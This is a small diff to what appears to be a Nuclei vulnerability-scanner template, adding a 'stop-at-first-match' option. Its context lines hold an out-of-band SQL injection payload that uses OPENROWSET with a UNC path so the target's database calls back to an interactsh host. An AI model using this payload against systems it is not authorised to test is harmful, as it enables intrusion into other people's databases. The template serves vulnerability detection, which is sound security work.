@@ -11,6 +11,7 @@ http:
     path:
       - "{{BaseURL}}/?id=1; SELECT * FROM OPENROWSET('MSDASQL', 'DRIVER={Microsoft Access Text Driver (*.txt;)};DefaultDir=\\\\{{interactsh-url}}\\\\;', 'SELECT * FROM test')--"
 
+    stop-at-first-match: true
     matchers:
       - type: word
         part: interactsh_protocol
